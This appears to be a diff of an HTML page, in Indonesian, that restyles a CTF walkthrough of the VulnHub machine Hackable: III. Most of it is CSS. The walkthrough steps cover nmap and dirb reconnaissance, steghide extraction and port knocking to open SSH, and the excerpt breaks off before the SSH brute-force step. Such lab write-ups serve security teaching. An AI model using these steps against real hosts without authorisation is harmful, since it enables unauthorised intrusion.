@@ -3,526 +3,408 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Write-Up: Pixel Detective - Hackable III</title>
+    <title>Pixel Detective | Hackable: III</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Share+Tech+Mono&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
     <style>
         /* === CSS VARIABLES === */
         :root {
-            --bg-color: #0d1117;
-            --card-bg: #161b22;
-            --text-main: #c9d1d9;
-            --text-muted: #8b949e;
-            --accent-green: #3fb950;
-            --accent-blue: #58a6ff;
-            --accent-red: #f85149;
-            --accent-yellow: #d29922;
-            --accent-purple: #bc8cff;
-            --border-color: #30363d;
-            --code-bg: #010409;
-            --font-main: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            --font-code: 'Consolas', 'Courier New', Courier, monospace;
+            --bg-dark: #050507;
+            --bg-panel: #0d0d12;
+            --neon-purple: #bc13fe;
+            --neon-blue: #00f0ff;
+            --neon-green: #00ff41;
+            --neon-red: #ff003c;
+            --neon-yellow: #ffb000;
+            --text-main: #e0e0e0;
+            --text-muted: #8b8b9b;
+            --border-color: #1f1f2e;
+            --font-mono: 'Fira Code', monospace;
+            --font-robot: 'Share Tech Mono', monospace;
+            --font-title: 'Orbitron', sans-serif;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { margin: 0; padding: 0; box-sizing: border-box; cursor: none; }
 
-        /* === CUSTOM SCROLLBAR === */
-        ::-webkit-scrollbar { width: 10px; height: 10px; }
-        ::-webkit-scrollbar-track { background: var(--bg-color); }
-        ::-webkit-scrollbar-thumb {
-            background: var(--border-color);
-            border-radius: 5px;
+        /* === CUSTOM CURSOR (CROSSHAIR PURPLE) === */
+        .cursor {
+            width: 24px; height: 24px;
+            border: 2px solid var(--neon-purple);
+            border-radius: 50%;
+            position: fixed; pointer-events: none; z-index: 9999;
+            transform: translate(-50%, -50%);
+            transition: width 0.2s, height 0.2s, background-color 0.2s, border-color 0.2s;
+            mix-blend-mode: screen;
         }
-        ::-webkit-scrollbar-thumb:hover { background: var(--accent-purple); }
 
+        .cursor::before, .cursor::after {
+            content: ''; position: absolute; background: var(--neon-purple);
+            transition: background 0.2s;
+        }
+        .cursor::before { width: 2px; height: 100%; left: 50%; top: 0; transform: translateX(-50%); }
+        .cursor::after { width: 100%; height: 2px; top: 50%; left: 0; transform: translateY(-50%); }
+
+        .cursor.hovering {
+            width: 48px; height: 48px;
+            background-color: rgba(188, 19, 254, 0.1);
+            border-color: var(--neon-blue);
+        }
+        .cursor.hovering::before, .cursor.hovering::after { background: var(--neon-blue); }
+
+        .cursor-trail {
+            width: 8px; height: 8px;
+            background: var(--neon-blue);
+            border-radius: 50%; position: fixed; pointer-events: none;
+            z-index: 9998; opacity: 0.6; transform: translate(-50%, -50%);
+            box-shadow: 0 0 10px var(--neon-blue);
+        }
+
+        /* === SCROLLBAR & PROGRESS BAR === */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-dark); }
+        ::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--neon-purple); }
+
+        #progress-bar {
+            position: fixed; top: 0; left: 0; height: 4px;
+            background: linear-gradient(to right, var(--neon-purple), var(--neon-blue));
+            width: 0%; z-index: 1000; box-shadow: 0 0 10px var(--neon-purple);
+        }
+
+        /* === BACKGROUND CANVAS === */
+        #particle-canvas {
+            position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: -1; opacity: 0.4;
+        }
+
+        /* === BODY === */
         body {
-            background-color: var(--bg-color);
+            background-color: var(--bg-dark);
             color: var(--text-main);
-            font-family: var(--font-main);
-            line-height: 1.6;
-            padding: 20px;
-            background-image: radial-gradient(circle at 90% 10%, rgba(188, 140, 255, 0.05) 0%, transparent 20%);
+            font-family: var(--font-robot);
+            line-height: 1.6; padding: 20px;
             overflow-x: hidden;
         }
 
-        .container { max-width: 1000px; margin: 0 auto; }
+        .container { max-width: 1000px; margin: 0 auto; position: relative; z-index: 1; }
 
-        /* === ANIMASI SCROLL (SLIDE UP & FADE IN) === */
-        .reveal {
-            opacity: 0;
-            transform: translateY(40px);
-            transition: all 0.8s cubic-bezier(0.5, 0, 0, 1);
-            will-change: opacity, transform;
-        }
-
-        .reveal.active {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        .reveal.active:nth-child(1) { transition-delay: 0.1s; }
-        .reveal.active:nth-child(2) { transition-delay: 0.2s; }
-        .reveal.active:nth-child(3) { transition-delay: 0.3s; }
-
-        /* === NAVIGATION BAR === */
+        /* === NAVBAR === */
         .navbar {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-bottom: 30px;
-            background-color: var(--card-bg);
-            padding: 15px;
-            border-radius: 10px;
+            display: flex; justify-content: center; gap: 15px;
+            background: rgba(13, 13, 18, 0.8);
+            padding: 15px; border-radius: 8px;
             border: 1px solid var(--border-color);
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-            flex-wrap: wrap;
-            animation: slideDown 0.8s ease-out;
+            margin-bottom: 30px; backdrop-filter: blur(10px);
+            flex-wrap: wrap; animation: slideDown 0.8s ease-out;
         }
-
-        @keyframes slideDown {
-            from { opacity: 0; transform: translateY(-30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        @keyframes slideDown { from { opacity: 0; transform: translateY(-30px); } to { opacity: 1; transform: translateY(0); } }
 
         .nav-link {
-            text-decoration: none;
-            color: var(--text-muted);
-            font-weight: bold;
-            padding: 10px 20px;
-            border-radius: 6px;
-            transition: all 0.3s ease;
-            border: 1px solid transparent;
+            text-decoration: none; color: var(--text-muted);
+            font-family: var(--font-mono); font-weight: bold;
+            padding: 10px 20px; border-radius: 4px;
+            transition: all 0.3s ease; border: 1px solid transparent;
         }
-
-        .nav-link:hover {
-            color: var(--accent-blue);
-            background-color: rgba(88, 166, 255, 0.1);
-            border-color: var(--accent-blue);
-            transform: translateY(-2px);
-        }
-
-        .nav-link.active {
-            color: #fff;
-            background-color: var(--accent-purple);
-            border-color: var(--accent-purple);
-            box-shadow: 0 0 15px rgba(188, 140, 255, 0.6);
-        }
+        .nav-link:hover { color: var(--neon-blue); background: rgba(0, 240, 255, 0.1); border-color: var(--neon-blue); }
+        .nav-link.active { color: #fff; background: var(--neon-purple); border-color: var(--neon-purple); box-shadow: 0 0 15px rgba(188, 19, 254, 0.4); }
 
         /* === HEADER === */
         header {
-            text-align: center;
-            padding: 50px 20px;
-            background: linear-gradient(135deg, #1f2937 0%, #111827 100%);
-            border-radius: 12px;
-            border: 1px solid var(--border-color);
-            margin-bottom: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            position: relative;
-            overflow: hidden;
-            animation: slideDown 1s ease-out;
-        }
-
-        header::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 4px;
-            background: linear-gradient(90deg, var(--accent-purple), var(--accent-blue), var(--accent-purple));
-            background-size: 200% 100%;
-            animation: gradientMove 3s linear infinite;
-        }
-
-        @keyframes gradientMove {
-            0% { background-position: 100% 0; }
-            100% { background-position: -100% 0; }
-        }
-
-        header h1 {
-            color: var(--accent-purple);
-            font-size: 2.8em;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            text-shadow: 0 0 10px rgba(188, 140, 255, 0.5);
-        }
-
-        header p { color: var(--text-muted); font-size: 1.2em; }
-
-        .badge {
-            display: inline-block;
-            background-color: rgba(88, 166, 255, 0.2);
-            border: 1px solid var(--accent-blue);
-            color: var(--accent-blue);
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 0.9em;
-            font-weight: bold;
-            margin: 10px 5px 0 5px;
-            transition: transform 0.3s, box-shadow 0.3s;
-        }
-
-        .badge:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 10px rgba(88, 166, 255, 0.5);
-        }
-
-        .badge-purple {
-            background-color: rgba(188, 140, 255, 0.2);
-            border: 1px solid var(--accent-purple);
-            color: var(--accent-purple);
-        }
-
-        .badge-purple:hover {
-            box-shadow: 0 0 10px rgba(188, 140, 255, 0.5);
-        }
-
-        /* === DOWNLOAD SECTION === */
-        .download-section {
-            text-align: center;
-            margin-bottom: 40px;
+            text-align: center; padding: 60px 20px;
+            background: radial-gradient(circle at center, rgba(188, 19, 254, 0.05) 0%, transparent 70%);
+            border-bottom: 1px solid var(--border-color);
+            margin-bottom: 30px; position: relative;
             animation: fadeIn 1.2s ease-out;
         }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+        header h1 {
+            font-family: var(--font-title); font-size: 2.8em;
+            color: #fff; text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 0 0 10px var(--neon-purple), 0 0 20px var(--neon-purple);
+            margin-bottom: 10px; animation: glitch 3s infinite;
         }
+        @keyframes glitch {
+            0% { transform: translate(0) }
+            2% { transform: translate(-2px, 2px) }
+            4% { transform: translate(-2px, -2px) }
+            6% { transform: translate(2px, 2px) }
+            8% { transform: translate(2px, -2px) }
+            10% { transform: translate(0) }
+            100% { transform: translate(0) }
+        }
+        header h1 span { color: var(--neon-purple); }
+        header p { color: var(--neon-blue); font-family: var(--font-mono); font-size: 1.1em; letter-spacing: 1px; }
 
+        .badge {
+            display: inline-block; padding: 5px 15px;
+            border-radius: 20px; font-family: var(--font-mono);
+            font-size: 0.85em; font-weight: bold; margin: 15px 5px 0 5px;
+            text-transform: uppercase;
+        }
+        .badge-blue { background: rgba(0, 240, 255, 0.1); border: 1px solid var(--neon-blue); color: var(--neon-blue); }
+        .badge-purple { background: rgba(188, 19, 254, 0.1); border: 1px solid var(--neon-purple); color: var(--neon-purple); }
+        .badge-green { background: rgba(0, 255, 65, 0.1); border: 1px solid var(--neon-green); color: var(--neon-green); }
+
+        /* === DOWNLOAD BUTTON === */
+        .download-section { text-align: center; margin-bottom: 40px; }
         .btn-download {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            background: linear-gradient(45deg, var(--accent-purple), var(--accent-blue));
-            color: #fff;
-            padding: 15px 30px;
-            border-radius: 50px;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 1.1em;
-            box-shadow: 0 4px 15px rgba(188, 140, 255, 0.4);
+            display: inline-flex; align-items: center; gap: 10px;
+            background: var(--bg-panel); color: var(--neon-purple);
+            padding: 15px 30px; border: 1px solid var(--neon-purple);
+            border-radius: 4px; text-decoration: none;
+            font-family: var(--font-mono); font-weight: bold;
+            position: relative; overflow: hidden;
             transition: all 0.3s ease;
-            border: none;
+            box-shadow: 0 0 10px rgba(188, 19, 254, 0.1);
         }
-
         .btn-download:hover {
-            transform: translateY(-3px) scale(1.05);
-            box-shadow: 0 8px 25px rgba(188, 140, 255, 0.6);
-            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
+            background: rgba(188, 19, 254, 0.1); transform: translateY(-3px);
+            box-shadow: 0 0 20px rgba(188, 19, 254, 0.4);
         }
-
-        .btn-download svg {
-            width: 24px;
-            height: 24px;
-            fill: currentColor;
-        }
+        .btn-download svg { width: 24px; height: 24px; fill: currentColor; }
 
         /* === STEP CARDS === */
         .step-card {
-            background-color: var(--card-bg);
+            background: rgba(13, 13, 18, 0.9);
             border: 1px solid var(--border-color);
-            border-radius: 10px;
-            padding: 30px;
-            margin-bottom: 30px;
-            transition: transform 0.3s, box-shadow 0.3s, border-color 0.3s;
+            border-left: 3px solid var(--border-color);
+            padding: 30px; margin-bottom: 30px;
             position: relative;
+            clip-path: polygon(0 0, calc(100% - 20px) 0, 100% 20px, 100% 100%, 20px 100%, 0 calc(100% - 20px));
+            transition: all 0.4s ease; backdrop-filter: blur(5px);
         }
-
         .step-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 8px 25px rgba(0,0,0,0.6);
-            border-color: var(--accent-purple);
+            border-left-color: var(--neon-purple);
+            border-color: var(--neon-blue);
+            box-shadow: 0 0 25px rgba(188, 19, 254, 0.1);
+            transform: translateY(-2px);
         }
 
         .step-card::before {
             content: attr(data-step);
-            position: absolute;
-            top: -15px;
-            left: 30px;
-            background-color: var(--accent-purple);
-            color: #fff;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-weight: bold;
-            font-size: 1.2em;
-            box-shadow: 0 4px 10px rgba(188, 140, 255, 0.4);
-            transition: transform 0.3s;
-        }
-
-        .step-card:hover::before {
-            transform: scale(1.1);
+            position: absolute; top: -15px; left: 30px;
+            background: var(--bg-dark); color: var(--neon-purple);
+            border: 1px solid var(--neon-purple);
+            padding: 5px 15px; border-radius: 20px;
+            font-family: var(--font-mono); font-size: 0.9em; font-weight: bold;
+            box-shadow: 0 0 10px rgba(188, 19, 254, 0.2);
         }
 
         .step-card h2 {
-            color: var(--accent-purple);
-            border-bottom: 1px solid var(--border-color);
-            padding-bottom: 10px;
-            margin: 15px 0 20px 0;
-            font-size: 1.5em;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            color: var(--neon-purple); font-family: var(--font-title);
+            font-size: 1.4em; margin: 15px 0 20px 0;
+            display: flex; align-items: center; gap: 10px;
+            border-bottom: 1px dashed var(--border-color);
+            padding-bottom: 10px; text-shadow: 0 0 5px rgba(188, 19, 254, 0.3);
         }
-
-        .step-card p { margin-bottom: 15px; }
-        .step-card ul { margin-left: 20px; margin-bottom: 15px; }
-        .step-card li { margin-bottom: 8px; }
+        .step-card h2::before { content: '>'; color: var(--neon-blue); font-family: var(--font-mono); }
+        .step-card p, .step-card ul, .step-card li { color: var(--text-muted); margin-bottom: 10px; }
+        .step-card ul { padding-left: 20px; }
+        .step-card strong { color: var(--text-main); }
 
         /* === CODE BLOCKS === */
         .code-block {
-            background-color: var(--code-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 15px;
-            font-family: var(--font-code);
-            color: #e6edf3;
-            overflow-x: auto;
-            margin: 15px 0;
-            position: relative;
-            font-size: 0.95em;
-            cursor: pointer;
+            background: #000; border: 1px solid var(--border-color);
+            border-left: 3px solid var(--neon-blue);
+            border-radius: 4px; padding: 15px;
+            font-family: var(--font-mono); font-size: 0.9em;
+            color: var(--neon-blue); overflow-x: auto; margin: 15px 0;
+            position: relative; cursor: pointer;
             transition: border-color 0.3s, box-shadow 0.3s;
         }
-
         .code-block::before {
-            content: attr(data-lang);
-            position: absolute;
-            top: 0;
-            right: 0;
-            background-color: var(--border-color);
-            color: var(--text-muted);
-            padding: 2px 10px;
-            font-size: 0.75em;
-            border-bottom-left-radius: 8px;
-            border-top-right-radius: 8px;
-            font-family: var(--font-main);
+            content: attr(data-lang); position: absolute; top: 0; right: 0;
+            background: rgba(0, 240, 255, 0.1); color: var(--neon-blue);
+            padding: 2px 10px; font-size: 0.75em;
+            border-bottom-left-radius: 4px; border-left: 1px solid var(--border-color); border-bottom: 1px solid var(--border-color);
         }
-
-        .code-block:hover { border-color: var(--accent-green); }
+        .code-block:hover { border-color: var(--neon-green); box-shadow: 0 0 15px rgba(0, 255, 65, 0.1); }
         .code-block span.copy-hint {
-            display: none;
-            position: absolute;
-            bottom: 5px;
-            right: 10px;
-            font-size: 0.7em;
-            color: var(--accent-green);
-            font-family: var(--font-main);
-            animation: pulse 1.5s infinite;
+            display: none; position: absolute; bottom: 5px; right: 10px;
+            font-size: 0.7em; color: var(--neon-green);
+            font-family: var(--font-mono); animation: blink 1s infinite;
         }
         .code-block:hover span.copy-hint { display: block; }
+        @keyframes blink { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
 
-        @keyframes pulse {
-            0% { opacity: 0.5; }
-            50% { opacity: 1; }
-            100% { opacity: 0.5; }
-        }
-
-        /* === NOTES & ALERTS === */
+        /* === ALERTS & NOTES === */
         .note, .alert, .success, .warning {
-            padding: 15px 20px;
-            border-radius: 8px;
-            margin: 20px 0;
-            font-size: 0.95em;
-            transition: transform 0.3s;
+            padding: 15px 20px; border-radius: 4px; margin: 20px 0;
+            font-family: var(--font-mono); font-size: 0.9em;
+            border-left: 4px solid; position: relative;
         }
-
-        .note:hover, .alert:hover, .success:hover, .warning:hover {
-            transform: translateX(5px);
-        }
-
-        .note { background-color: rgba(88, 166, 255, 0.1); border-left: 4px solid var(--accent-blue); }
-        .alert { background-color: rgba(248, 81, 73, 0.1); border-left: 4px solid var(--accent-red); }
-        .success { background-color: rgba(63, 185, 80, 0.1); border-left: 4px solid var(--accent-green); }
-        .warning { background-color: rgba(210, 153, 34, 0.1); border-left: 4px solid var(--accent-yellow); }
+        .note { background: rgba(0, 240, 255, 0.05); border-color: var(--neon-blue); color: #a5f3fc; }
+        .alert { background: rgba(255, 0, 60, 0.05); border-color: var(--neon-red); color: #fca5a5; }
+        .success { background: rgba(0, 255, 65, 0.05); border-color: var(--neon-green); color: #86efac; }
+        .warning { background: rgba(255, 176, 0, 0.05); border-color: var(--neon-yellow); color: #fcd34d; }
 
         /* === BUTTONS === */
         .btn {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background-color: var(--accent-blue);
-            color: #fff;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: bold;
-            text-decoration: none;
-            transition: all 0.3s ease;
-            margin: 10px 5px;
-            font-size: 1em;
+            display: inline-flex; align-items: center; gap: 8px;
+            background: var(--bg-panel); color: var(--neon-blue);
+            border: 1px solid var(--neon-blue); padding: 10px 20px;
+            border-radius: 4px; text-decoration: none; font-family: var(--font-mono);
+            font-weight: bold; transition: all 0.3s ease;
+            margin: 10px 5px; font-size: 0.9em; cursor: pointer;
         }
+        .btn:hover { background: rgba(0, 240, 255, 0.1); box-shadow: 0 0 15px rgba(0, 240, 255, 0.3); transform: translateY(-2px); }
 
-        .btn:hover { 
-            background-color: #1f6feb; 
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(88, 166, 255, 0.4);
-        }
-
-        /* === FLAG SECTION (RESPONSIVE ASCII) === */
+        /* === FLAG SECTION === */
         .flag-container {
-            background: linear-gradient(135deg, rgba(188, 140, 255, 0.15) 0%, rgba(0,0,0,0) 100%);
-            border: 2px dashed var(--accent-purple);
-            border-radius: 12px;
-            padding: 30px;
-            margin-top: 40px;
-            box-shadow: 0 0 20px rgba(188, 140, 255, 0.1);
+            background: linear-gradient(135deg, rgba(188, 19, 254, 0.05) 0%, transparent 100%);
+            border: 2px dashed var(--neon-purple);
+            border-radius: 8px; padding: 40px 30px;
+            margin-top: 40px; box-shadow: 0 0 20px rgba(188, 19, 254, 0.05);
             transition: box-shadow 0.3s;
         }
+        .flag-container:hover { box-shadow: 0 0 30px rgba(188, 19, 254, 0.2); }
+        .flag-container h3 { color: var(--neon-purple); font-family: var(--font-title); text-transform: uppercase; margin-bottom: 20px; font-size: 1.5em; text-align: center; }
 
-        .flag-container:hover {
-            box-shadow: 0 0 30px rgba(188, 140, 255, 0.3);
-        }
-
-        .flag-container h3 {
-            color: var(--accent-purple);
-            margin-bottom: 20px;
-            font-size: 1.5em;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            text-align: center;
-        }
-
-        .flag-box {
-            margin-bottom: 40px;
-        }
-
-        .flag-box h4 {
-            margin-bottom: 10px;
-            font-size: 1.2em;
-        }
-
+        .flag-box { margin-bottom: 40px; }
+        .flag-box h4 { margin-bottom: 10px; font-size: 1.2em; font-family: var(--font-mono); }
+        
         .ascii-art {
-            background-color: #000;
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 15px;
-            overflow-x: auto;
-            margin-bottom: 15px;
+            background: #000; border: 1px solid var(--border-color);
+            border-radius: 4px; padding: 15px; overflow-x: auto; margin-bottom: 15px;
         }
-
         .ascii-art pre {
-            margin: 0;
-            font-family: var(--font-code);
-            color: #fff;
-            font-size: 0.85em;
-            line-height: 1.1;
-            white-space: pre;
-            display: inline-block;
+            margin: 0; font-family: var(--font-mono); color: #fff;
+            font-size: 0.85em; line-height: 1.1; white-space: pre;
+            display: inline-block; text-shadow: 0 0 5px rgba(255, 255, 255, 0.3);
         }
 
         .invite-link {
-            color: var(--accent-green);
-            font-size: 0.9em;
-            font-weight: bold;
-            word-break: break-all;
-            text-decoration: none;
+            color: var(--neon-green); font-size: 0.9em;
+            font-family: var(--font-mono); font-weight: bold;
+            word-break: break-all; text-decoration: none;
             transition: color 0.3s;
         }
-
-        .invite-link:hover {
-            color: #fff;
-            text-decoration: underline;
-        }
+        .invite-link:hover { color: #fff; text-decoration: underline; text-shadow: 0 0 10px var(--neon-green); }
 
         /* === FOOTER === */
         footer {
-            text-align: center;
-            padding: 30px;
-            color: var(--text-muted);
-            font-size: 0.9em;
-            border-top: 1px solid var(--border-color);
-            margin-top: 50px;
+            text-align: center; padding: 30px; color: var(--text-muted);
+            font-family: var(--font-mono); font-size: 0.8em;
+            border-top: 1px solid var(--border-color); margin-top: 50px;
         }
 
+        /* === SCROLL ANIMATION === */
+        .reveal { opacity: 0; transform: translateY(40px); transition: all 0.8s cubic-bezier(0.5, 0, 0, 1); will-change: opacity, transform; }
+        .reveal.active { opacity: 1; transform: translateY(0); }
+
+        /* === BACK TO TOP === */
+        #back-to-top {
+            position: fixed; bottom: 30px; right: 30px;
+            background: var(--bg-panel); color: var(--neon-purple);
+            border: 1px solid var(--neon-purple); width: 50px; height: 50px;
+            display: flex; justify-content: center; align-items: center;
+            font-size: 1.5em; opacity: 0; visibility: hidden;
+            transition: all 0.3s ease; z-index: 100;
+        }
+        #back-to-top.show { opacity: 1; visibility: visible; }
+        #back-to-top:hover { box-shadow: 0 0 20px var(--neon-purple); background: rgba(188, 19, 254, 0.1); cursor: pointer; }
+
         /* === RESPONSIVE === */
-        @media (max-width: 600px) {
-            body { padding: 10px; }
-            header { padding: 30px 15px; }
-            header h1 { font-size: 1.8em; letter-spacing: 1px; }
+        @media (max-width: 768px) {
+            header h1 { font-size: 1.8em; }
             .step-card { padding: 20px 15px; }
-            .step-card::before { font-size: 1em; }
-            .btn { width: 100%; justify-content: center; }
-            .flag-container { padding: 15px; }
-            .ascii-art pre { font-size: 0.7em; }
             .navbar { flex-direction: column; gap: 10px; }
-            .btn-download { width: 100%; padding: 15px; font-size: 1em; }
+            .btn-download { width: 100%; justify-content: center; }
+            .cursor, .cursor-trail { display: none; }
+            * { cursor: auto; }
+            .ascii-art pre { font-size: 0.7em; }
         }
     </style>
 </head>
 <body>
 
+    <!-- Progress Bar & Custom Cursor -->
+    <div id="progress-bar"></div>
+    <div class="cursor" id="cursor"></div>
+    <div class="cursor-trail" id="cursor-trail"></div>
+    <canvas id="particle-canvas"></canvas>
+
     <div class="container">
         
-        <!-- NAVIGATION BAR -->
+        <!-- NAVBAR -->
         <nav class="navbar">
-            <a href="index.html" class="nav-link">The Planets: Earth</a>
-            <a href="write2.html" class="nav-link active">Hackable: III</a>
+            <a href="index.html" class="nav-link">[ THE_PLANETS: EARTH ]</a>
+            <a href="#" class="nav-link active">[ HACKABLE: III ]</a>
         </nav>
 
         <!-- HEADER -->
         <header>
-            <h1>Pixel Detective</h1>
-            <p>Write-Up: VulnHub - Hackable: III</p>
+            <h1>Pixel <span>Detective</span></h1>
+            <p>// WRITE-UP: VULNHUB - HACKABLE: III</p>
             <div>
-                <span class="badge badge-purple">Level: Medium</span>
-                <span class="badge" style="border-color: var(--accent-green); color: var(--accent-green); background-color: rgba(63, 185, 80, 0.2);">Status: Completed</span>
+                <span class="badge badge-purple">LEVEL: MEDIUM</span>
+                <span class="badge badge-green">STATUS: COMPLETED</span>
             </div>
         </header>
 
-        <!-- DOWNLOAD SECTION -->
-        <div class="download-section">
+        <!-- DOWNLOAD -->
+        <div class="download-section reveal">
             <a href="https://download.vulnhub.com/hackable/hackable3.ova" target="_blank" class="btn-download">
                 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
-                Download hackable3.ova (1.6 GB)
+                DOWNLOAD_HACKABLE3.OVA (1.6 GB)
             </a>
         </div>
 
         <!-- STEP 0 -->
-        <div class="step-card reveal" data-step="Langkah 0">
-            <h2>🛠️ Persiapan & Konfigurasi Jaringan</h2>
+        <div class="step-card reveal" data-step="STEP_00">
+            <h2>PERSIAPAN & KONFIGURASI JARINGAN</h2>
             <p>Pastikan mesin virtual Kali Linux dan target (Hackable III) berada di jaringan yang sama. Disarankan menggunakan <strong>Host-Only Adapter</strong> di VirtualBox.</p>
             <div class="code-block" data-lang="bash">
-                <code># Cek IP Kali<br>ip a</code>
-                <span class="copy-hint">Klik untuk copy</span>
+                <code># Cek IP Kali
+ip a</code>
+                <span class="copy-hint">[ CLICK_TO_COPY ]</span>
             </div>
         </div>
 
         <!-- STEP 1 -->
-        <div class="step-card reveal" data-step="Langkah 1">
-            <h2>🔍 Information Gathering & Enumerasi Awal</h2>
+        <div class="step-card reveal" data-step="STEP_01">
+            <h2>INFORMATION GATHERING & ENUMERASI AWAL</h2>
             <p>Setelah mesin virtual di-import dan dinyalakan, langkah pertama adalah menemukan IP target dan memindai port yang terbuka.</p>
             <div class="code-block" data-lang="bash">
-                <code># Temukan IP target<br>sudo netdiscover -r 192.168.56.0/24<br><br># Scan port dengan Nmap<br>nmap -sC -sV -p- 192.168.56.103</code>
-                <span class="copy-hint">Klik untuk copy</span>
+                <code># Temukan IP target
+sudo netdiscover -r 192.168.56.0/24
+
+# Scan port dengan Nmap
+nmap -sC -sV -p- 192.168.56.103</code>
+                <span class="copy-hint">[ CLICK_TO_COPY ]</span>
             </div>
             <div class="note">
-                💡 <strong>Hasil Scan:</strong> Port <strong>22 (SSH)</strong> berstatus <em>filtered</em> (tertutup dari luar), dan Port <strong>80 (HTTP)</strong> terbuka. Ini mengindikasikan adanya mekanisme <em>Port Knocking</em>.
+                💡 <strong>HASIL SCAN:</strong> Port <strong>22 (SSH)</strong> berstatus <em>filtered</em> (tertutup dari luar), dan Port <strong>80 (HTTP)</strong> terbuka. Ini mengindikasikan adanya mekanisme <em>Port Knocking</em>.
             </div>
         </div>
 
         <!-- STEP 2 -->
-        <div class="step-card reveal" data-step="Langkah 2">
-            <h2>🌐 Enumerasi Web & Mencari Petunjuk</h2>
+        <div class="step-card reveal" data-step="STEP_02">
+            <h2>ENUMERASI WEB & MENCARI PETUNJUK</h2>
             <p>Buka browser dan akses <code>http://192.168.56.103</code>. Lakukan <em>Directory Busting</em> untuk mencari direktori atau file tersembunyi.</p>
             <div class="code-block" data-lang="bash">
                 <code>dirb http://192.168.56.103/</code>
-                <span class="copy-hint">Klik untuk copy</span>
+                <span class="copy-hint">[ CLICK_TO_COPY ]</span>
             </div>
             <p>Ditemukan beberapa direktori penting: <code>/backup/</code>, <code>/config/</code>, dan <code>/css/</code>. Cek juga <em>source code</em> halaman utama (Ctrl+U), di sana ada komentar tersembunyi:</p>
             <div class="code-block" data-lang="html">
                 <code>&lt;!-- "Please, jubiscleudo, don't forget to activate the port knocking when exiting your section..." --&gt;</code>
-                <span class="copy-hint">Klik untuk copy</span>
+                <span class="copy-hint">[ CLICK_TO_COPY ]</span>
             </div>
         </div>
 
         <!-- STEP 3 -->
-        <div class="step-card reveal" data-step="Langkah 3">
-            <h2>🔑 Mengumpulkan Kunci Port Knocking</h2>
+        <div class="step-card reveal" data-step="STEP_03">
+            <h2>MENGUMPULKAN KUNCI PORT KNOCKING</h2>
             <p>Kita harus menemukan 3 port untuk melakukan <em>Port Knocking</em>.</p>
             
             <p><strong>1. Port Pertama (Base64)</strong></p>
             <p>Buka <code>/config/1.txt</code>. Isinya adalah string Base64 <code>MTAwMDA=</code>. Decode string tersebut:</p>
             <div class="code-block" data-lang="bash">
                 <code>echo "MTAwMDA=" | base64 -d</code>
-                <span class="copy-hint">Klik untuk copy</span>
+                <span class="copy-hint">[ CLICK_TO_COPY ]</span>
             </div>
             <p>Hasilnya adalah <strong><code>10000</code></strong>.</p>
 
@@ -532,112 +414,130 @@
             <p><strong>3. Port Ketiga (Steganografi)</strong></p>
             <p>Di direktori <code>/login_page/</code>, terdapat file <code>3.jpg</code>. Unduh dan ekstrak dengan <code>steghide</code> (tekan Enter saat diminta passphrase).</p>
             <div class="code-block" data-lang="bash">
-                <code>wget http://192.168.56.103/login_page/3.jpg<br>steghide extract -sf 3.jpg</code>
-                <span class="copy-hint">Klik untuk copy</span>
+                <code>wget http://192.168.56.103/login_page/3.jpg
+steghide extract -sf 3.jpg</code>
+                <span class="copy-hint">[ CLICK_TO_COPY ]</span>
             </div>
             <p>Baca file hasil ekstraksi, di sana tertulis port ketiga: <strong><code>65535</code></strong>.</p>
         </div>
 
         <!-- STEP 4 -->
-        <div class="step-card reveal" data-step="Langkah 4">
-            <h2>🚪 Port Knocking & Brute Force SSH</h2>
+        <div class="step-card reveal" data-step="STEP_04">
+            <h2>PORT KNOCKING & BRUTE FORCE SSH</h2>
             <p>Sekarang kita punya urutan portnya: <strong>10000</strong>, <strong>4444</strong>, <strong>65535</strong>. Lakukan <em>Port Knocking</em> untuk membuka port SSH (22).</p>
             <div class="code-block" data-lang="bash">
-                <code>knock 192.168.56.103 10000 4444 65535<br>nmap -p 22 192.168.56.103</code>
-                <span class="copy-hint">Klik untuk copy</span>
+                <code>knock 192.168.56.103 10000 4444 65535
+nmap -p 22 192.168.56.103</code>
+                <span class="copy-hint">[ CLICK_TO_COPY ]</span>
             </div>
             <div class="success">
-                ✅ <strong>Berhasil:</strong> Port 22 sekarang berstatus <code>open</code>.
